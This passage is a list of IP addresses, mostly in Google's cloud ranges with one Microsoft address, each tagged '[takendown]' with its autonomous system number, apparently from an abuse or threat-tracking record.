[takendown] 35.203.143.138               "AS15169 Google LLC"
[takendown] 35.203.167.224               "AS15169 Google LLC"
[takendown] 35.203.18.30                 "AS15169 Google LLC"
[takendown] 35.203.183.182               "AS15169 Google LLC"
[takendown] 35.203.25.136                "AS15169 Google LLC"
[takendown] 35.203.3.16                  "AS15169 Google LLC"
[takendown] 35.203.48.110                "AS15169 Google LLC"
[takendown] 35.203.5.160                 "AS15169 Google LLC"
[takendown] 35.203.8.203                 "AS15169 Google LLC"
[takendown] 35.204.146.109               "AS15169 Google LLC"
[takendown] 35.204.51.103                "AS15169 Google LLC"
[takendown] 35.204.77.160                "AS15169 Google LLC"
[takendown] 35.204.80.189                "AS15169 Google LLC"
[takendown] 35.205.148.72                "AS15169 Google LLC"
[takendown] 35.205.24.104                "AS15169 Google LLC"
[takendown] 35.221.110.75                "AS19527 Google LLC"
[takendown] 35.221.71.123                "AS19527 Google LLC"
[takendown] 35.227.25.22                 "AS15169 Google LLC"
[takendown] 35.228.156.223               "AS15169 Google LLC"
[takendown] 35.228.156.99                "AS15169 Google LLC"
[takendown] 35.228.240.14                "AS15169 Google LLC"
[takendown] 35.228.244.19                "AS15169 Google LLC"
[takendown] 35.228.73.198                "AS15169 Google LLC"
[takendown] 35.228.90.15                 "AS15169 Google LLC"
[takendown] 35.230.104.237               "AS15169 Google LLC"
[takendown] 35.230.158.25                "AS15169 Google LLC"
[takendown] 35.230.162.54                "AS15169 Google LLC"
[takendown] 35.230.165.35                "AS15169 Google LLC"
[takendown] 35.231.163.40                "AS15169 Google LLC"
[takendown] 35.231.60.255                "AS15169 Google LLC"
[takendown] 35.231.68.186                "AS15169 Google LLC"
[takendown] 35.232.10.244                "AS15169 Google LLC"
[takendown] 35.234.131.31                "AS15169 Google LLC"
[takendown] 35.234.136.116               "AS15169 Google LLC"
[takendown] 35.234.156.85                "AS15169 Google LLC"
[takendown] 35.234.158.120               "AS15169 Google LLC"
[takendown] 35.234.77.117                "AS15169 Google LLC"
[takendown] 35.234.89.25                 "AS15169 Google LLC"
[takendown] 35.234.94.97                 "AS15169 Google LLC"
[takendown] 35.236.117.108               "AS15169 Google LLC"
[takendown] 35.236.2.49                  "AS15169 Google LLC"
[takendown] 35.236.222.1                 "AS15169 Google LLC"
[takendown] 35.236.246.82                "AS15169 Google LLC"
[takendown] 35.236.25.247                "AS15169 Google LLC"
[takendown] 35.236.254.11                "AS15169 Google LLC"
[takendown] 35.236.34.51                 "AS15169 Google LLC"
[takendown] 35.237.127.167               "AS15169 Google LLC"
[takendown] 35.237.204.11                "AS15169 Google LLC"
[takendown] 35.237.215.211               "AS15169 Google LLC"
[takendown] 35.237.32.144                "AS15169 Google LLC"
[takendown] 35.237.68.143                "AS15169 Google LLC"
[takendown] 35.238.4.122                 "AS15169 Google LLC"
[takendown] 35.238.74.24                 "AS15169 Google LLC"
[takendown] 35.240.156.17                "AS15169 Google LLC"
[takendown] 35.240.212.106               "AS15169 Google LLC"
[takendown] 35.240.234.169               "AS15169 Google LLC"
[takendown] 35.240.94.181                "AS15169 Google LLC"
[takendown] 35.241.151.23                "AS15169 Google LLC"
[takendown] 35.242.134.99                "AS15169 Google LLC"
[takendown] 35.242.140.13                "AS15169 Google LLC"
[takendown] 35.242.143.117               "AS15169 Google LLC"
[takendown] 35.242.152.241               "AS15169 Google LLC"
[takendown] 35.242.203.94                "AS15169 Google LLC"
[takendown] 35.242.245.109               "AS15169 Google LLC"
[takendown] 40.74.85.45                  "AS8075 Microsoft Corporation"
```
